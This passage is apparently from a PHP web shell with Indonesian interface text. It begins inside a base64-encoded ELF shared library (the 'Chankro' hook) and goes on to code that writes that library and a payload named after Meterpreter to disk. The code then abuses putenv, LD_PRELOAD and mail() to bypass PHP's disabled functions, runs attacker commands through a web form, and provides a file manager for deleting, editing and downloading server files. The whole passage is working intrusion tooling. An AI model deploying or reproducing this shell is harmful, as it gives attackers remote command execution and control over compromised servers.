APIAAAAAAABgAAAAUAAAAAAAAAAAAAAOgPIAAAAAAABgAAAAcAAAAAAAAAAAAAAPAPIAAAAAAABgAAAAoAAAAAAAAAAAAAAPgPIAAAAAAABgAAAAsAAAAAAAAAAAAAABgQIAAAAAAABwAAAAEAAAAAAAAAAAAAACAQIAAAAAAABwAAAA4AAAAAAAAAAAAAACgQIAAAAAAABwAAAAMAAAAAAAAAAAAAADAQIAAAAAAABwAAABQAAAAAAAAAAAAAADgQIAAAAAAABwAAAAQAAAAAAAAAAAAAAEAQIAAAAAAABwAAAAYAAAAAAAAAAAAAAEgQIAAAAAAABwAAAAgAAAAAAAAAAAAAAFAQIAAAAAAABwAAAAkAAAAAAAAAAAAAAFgQIAAAAAAABwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECM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8AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAA8AEAAAAAAADwAQAAAAAAAEQAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAD4AQAAAAAAAAQAAAABAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAAAwBAAAAAAAADAEAAAAAAAA6QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAGgUAAAAAAAAaBQAAAAAAACoAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAAEgFAAAAAAAASAUAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAA2AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAQAYAAAAAAABABgAAAAAAANgAAAAAAAAAAwAAABYAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAABgHAAAAAAAAGAcAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAwBwAAAAAAADAHAAAAAAAAoAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAA0AcAAAAAAADQBwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAOAHAAAAAAAA4AcAAAAAAAB6AQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAABcCQAAAAAAAFwJAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAAZQkAAAAAAABlCQAAAAAAABMAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAAHgJAAAAAAAAeAkAAAAAAAA0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAACwCQAAAAAAALAJAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAA+A0gAAAAAAD4DQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAgOIAAAAAAACA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAABAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADQAAAABgAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAANgPIAAAAAAA2A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAYBAgAAAAAABgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACYEAAAAAAAABgGAAAAAAAAGwAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAsBYAAAAAAABLAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';

    if (!is_dir($full)) mkdir($full, 0777, true);
    $a($full . '/chankro.so', $base($hook));
    $a($full . '/acpid.socket', $base($meterpreter));
    $p('CHANKRO=' . $full . '/acpid.socket');
    $p('LD_PRELOAD=' . $full . '/chankro.so');
    @$m('a','a','a','a');
    
    $redirect = $_SERVER['SCRIPT_NAME'] . '?path=' . urlencode($workdir) . '&komendv3=gaskan';
    header("Location: " . $redirect);
    exit;
}

if (isset($_GET['showv3'])) {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    $outFile = __DIR__ . '/out.txt';
    if (file_exists($outFile)) {
        readfile($outFile);
    } else {
        echo "No output yet.\n\nHint: Pastikan fungsi putenv() dan mail() aktif, serta direktori writable.";
    }
    exit;
}

if (isset($_GET['komendv3'])) {
    $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    echo "<center>";
    echo '<form method="post" action="" id="pwnFormV3">
            <input type="hidden" name="path_v3" value="'.htmlspecialchars($current_path).'">
            <span>'.@get_current_user().'@'.ipserv().':~ $ [LD_PRELOAD] </span>
            <input type="text" name="cmdbyp_v3" id="pwnCmdV3" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off" placeholder="Enter command">
            <button type="submit" class="up" style="cursor:pointer;">>></button>
          </form>
          <iframe id="pwnResultV3" src="?showv3=1" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
          <script>
            document.getElementById("pwnFormV3").addEventListener("submit", function(e) {
                var iframe = document.getElementById("pwnResultV3");
                setTimeout(function() {
                    iframe.src = "?showv3=1&t=" + Date.now();
                }, 500);
            });
          </script>';
    echo '<br><small>Teknik: putenv() + mail() + LD_PRELOAD. Hasil perintah disimpan di <b>out.txt</b> di FOLDER SCRIPT (tetap).<br>
          Pastikan fungsi <b>putenv()</b> dan <b>mail()</b> tidak diblokir, dan folder script writable.</small>';
    echo "</center>";
    exit;
}

if (!is_readable($lokasi)) {
    die("<center>This directory is unreadable :(</center>");
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Last Modified</center></td>
<td><center>Owner</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
    if(!is_dir($lokasi."/".$dir) || $dir == '.') continue;
    echo "<tr>
    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
    <td><center>".filedate($lokasi."/".$dir)."</center></td>
    <td>".owner($lokasi."/".$dir)."</td>
    <td><center>";
    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
    echo statusnya($lokasi."/".$dir);
    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

    echo "</center></td>
    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
    <select name=\"pilih\">
    <option value=\"\"></option>
    <option value=\"hapus\">Delete</option>
    <option value=\"gantinama\">Rename</option>
    </select>
    <input type=\"hidden\" name=\"type\" value=\"dir\">
    <input type=\"hidden\" name=\"name\" value=\"$dir\">
    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
    <input type=\"submit\" class=\"gas\" value=\">\" />
    </form></center></td>
    </tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
    if(!is_file("$lokasi/$file")) continue;
    $size = filesize("$lokasi/$file")/1024;
    $size = round($size,3);
    if($size >= 1024){
    $size = round($size/1024,2).' MB';
} else {
    $size = $size.' KB';
}

echo "<tr>
<td>".cekfile($lokasi."/".$file)."<a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>".filedate($lokasi."/".$file)."</center></td>
<td>".owner($lokasi."/".$file)."</td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"dunlut\">Download</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>";
if (class_exists("ZipArchive")) {
    echo "<option value=\"unzip\">Unzip</option>";
}
echo "</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$izin = substr(sprintf('%o', fileperms($file)), -4);
return $izin;
}
?>